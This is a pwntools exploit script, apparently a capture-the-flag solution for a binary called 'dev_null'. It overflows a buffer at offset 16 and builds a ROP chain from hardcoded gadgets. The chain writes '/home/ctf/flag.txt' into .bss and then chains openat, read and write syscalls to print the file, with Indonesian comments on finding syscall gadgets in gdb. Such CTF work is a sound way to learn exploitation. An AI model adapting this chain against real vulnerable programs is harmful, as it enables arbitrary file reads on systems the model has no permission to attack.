from pwn import *
import time
elf = context.binary = ELF("./dev_null")
p = process()
offset = 16
syscall = p64(0x000000000040143c)
mov_qword_ptr_rsi_rax = 0x420f45
pop_rax = p64(0x000000000042193c)
pop_rdi = p64(0x0000000000413795)
pop_rsi_rbp = p64(0x0000000000402acc)
xchg_rdx_rax = 0x41799a
flag = b"/home/ct"
flag2 = b"f/flag.t"
flag3 = b"xt\x00\x00\x00\x00\x00\x00"
bss = 0x4afaa0
rop = ROP(context.binary)
# buffer = 0x00000000004a9800

def write_path():
    rop.raw(b"A" * 16)
    rop.rsi = bss
    rop.rax = u64(flag)
    rop.raw(mov_qword_ptr_rsi_rax)
    rop.rsi = bss +8
    rop.rax = u64(flag2)
    rop.raw(mov_qword_ptr_rsi_rax)
    rop.rsi = bss + 16
    rop.rax = u64(flag3)
    rop.raw(mov_qword_ptr_rsi_rax)

def openat():
    rop.rdi = -1
    rop.rsi = bss
    rop.rax = constants.SYS_openat
    rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
    # fungsi ini untuk mencari syscall + ret (syscall; ret;)
    # biasanya jika ROPgadget tidak dapat menangkap syscall; ret;
    # kita bisa mencarinya secara manual menggunakan gdb 
    # find /b 0x400000, 0x500000, 0x0f, 0x05, 0xc3 (0f05 --> syscall); (0xc3 --> ret);
    # untuk lebih detailnya baca script manual.py
    print(f"OPENAT: {constants.SYS_openat}")
    print(f"OPENAT: {rop.find_gadget(['syscall', 'ret'])[0]}")

def readS():
    rop.rdi = 3
    rop.rsi = bss + 24
    rop.rax = 46
    rop.raw(xchg_rdx_rax)
    rop.rax = constants.SYS_read
    rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

def writeS():
    rop.rdi = 1
    rop.rsi = bss + 24
    rop.rax = 46
    rop.raw(xchg_rdx_rax)
    rop.rax = constants.SYS_write
    rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

write_path()
openat()
readS()
writeS()
time.sleep(30)
p.sendline(rop.chain())
write("payload",rop.chain())
print(p.recvline())
print(p.recvline())
